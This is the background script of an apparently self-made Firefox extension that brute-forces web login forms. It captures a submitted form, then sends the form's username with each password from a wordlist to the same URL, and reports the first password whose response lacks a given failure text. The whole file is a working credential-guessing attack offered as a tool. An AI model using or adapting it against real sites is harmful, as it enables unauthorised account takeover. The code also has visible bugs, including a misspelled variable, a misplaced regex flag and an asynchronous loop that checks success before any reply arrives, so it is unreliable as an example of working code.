var isCracking = false;
var windowopen = false;
var types = [];
var pattern = false;
var failpattern;
var crackuser;
var wordlist;
var msgHandler = () => {};
var cracked = false;
var pagedata;

function handleMessage(msg) {
  msgHandler(msg);
}

function cracking_header_listener(e) {
  if((e.originUrl || "").indexOf("moz-extension://") === 0) return e;
  if(!~types.indexOf(e.type)) return e;
  if(pattern && null === e.url.match(RegExp(pattern, "g"))) return e;
  return new Promise(done => {
    var data = {
      method: e.method,
      url: e.url,
      type: e.type,
      headers: []
    };
    e.requestHeaders.forEach(function(header) {
      data.headers.push({
        name: header.name,
        value: header.value
      });
    });
    done({
      requestHeaders: data.headers
    });
  });
}

function crack_it(e) {
  var un_f;
  var pw_f;
  var iter;
  var ops = "";
  pagedata.body.forEach(body => {
    if(body.value == "UN") {
      un_f = body.name;
    }
    if(body.value == "PW") {
      pw_f = body.name;
    } else {
      if ((body.value != "PW") && (body.value != "UN")) {
        ops = ops.concat(body.name, "=", body.value, "&");
      }
    }
  });
  var wordbyline = wordlist.split("\n");
  console.log(e.originUrl);
  for(iter = 0; iter < wordbyline.length-1; iter++) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", e.originUrl, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    console.log("Trying: " + crackuser + " " + wordbyline[iter]);
    xhr.send(ops + un_f + "=" + crackuser + "&" + pw_f + "=" + wordbyline[iter]);
    xhr.onload  = function() {
      var databack = this.responseText;
      if(databack.length < 5) {
        console.log("Error short page.");
      } else if((databack.match(RegExp(failpattern), "gi") != null) && (databack.length > 5)) {
        console.log("Bad password" + wordybline[iter]);
      } else if((databack.match(RegExp(failpattern), "gi") == null) && (databack.length > 5)) {
        cracked = true;
      }
    }
    if(cracked == true) {
      break;
    }
  }
  if(cracked == true) {
  return new Promise(done => {
    browser.windows.create({
      url: "cracked.html?login=" + crackuser + "&password=" + wordbyline[iter],
      type: "panel"
    }).then(w => {
      });
    });
 stop_cracking();
  }
  else {
    console.log("Sorry, couldn't crack with this wordlist");
  }
}

function cracking_request_listener(e) {
  if((e.originUrl || "").indexOf("moz-extension://") === 0) return e;
  if(!~types.indexOf(e.type)) return e;
  if(pattern && null === e.url.match(RegExp(pattern, "g"))) return e;
  return new Promise(done => {
    var body = [];
    if(e.requestBody && e.requestBody.formData) {
      for(var n in e.requestBody.formData) {
        if(e.requestBody.formData.hasOwnProperty(n)) body.push({
          name: n,
          value: e.requestBody.formData[n][0]
        });
      }
    }
    pagedata = {
      method: e.method,
      url: e.url,
      type: e.type,
      body: body
    };
    done(e);
    crack_it(e);
  });
}

function stop_cracking_listener() {
  var listening = browser.webRequest.onBeforeSendHeaders.hasListener(cracking_header_listener);
  if(listening) {
    browser.webRequest.onBeforeSendHeaders.removeListener(cracking_header_listener);
    browser.webRequest.onBeforeRequest.removeListener(cracking_request_listener);
  }
}

function start_cracking_listener() {
  browser.webRequest.onBeforeSendHeaders.addListener(cracking_header_listener, {
      urls: ["<all_urls>"]
    },
    ["blocking", "requestHeaders"]);
  browser.webRequest.onBeforeRequest.addListener(cracking_request_listener, {
      urls: ["<all_urls>"]
    },
    ["blocking", "requestBody"]);
}

function user_confirm_cracking() {
  return new Promise(done => {
    browser.windows.create({
      url: "popup.html",
      type: "panel",
      allowScriptsToClose: true
    }).then(w => {
      msgHandler = msg => {
        types = msg.types;
        pattern = msg.docpattern;
        failpattern = msg.failpattern;
        crackuser = msg.crackuser;
        wordlist = msg.wordlist;
        browser.windows.getCurrent().then(wi => {
          browser.windows.remove(wi.id);
          done(msg);
        });
      };
    });
  });
}

function user_modify_headers(data) {
  return new Promise(done => {
    browser.windows.create({
      url: "headers.html?" + encodeURIComponent(JSON.stringify(data)),
      type: "panel",
      allowScriptsToClose: true
    }).then(w => {
      msgHandler = msg => {
        browser.windows.getCurrent().then(wi => {
          browser.windows.remove(wi.id);
          done(msg);
        });
      };
    });
  });
}

function user_modify_body(data) {}

function confirm_and_start_cracking() {
  user_confirm_cracking().then(res => {
    if(res.tamper === true) {
      isCracking = true;
      browser.browserAction.setIcon({
        path: {
          "48": "images/crackedegg.png",
          "32": "images/crackedegg.png",
          "16": "images/crackedegg.png"
        }
      });
      start_cracking_listener();
    }
  });
}

function stop_cracking() {
  isCracking = false;
  browser.browserAction.setIcon({
    path: {
      "48": "images/wholeegg.png",
      "32": "images/wholeegg.png",
      "16": "images/wholeegg.png"
    }
  });
  stop_cracking_listener();
}
browser.runtime.onMessage.addListener(handleMessage);
browser.browserAction.onClicked.addListener(() => {
  if(!isCracking) confirm_and_start_cracking();
  else stop_cracking();
});
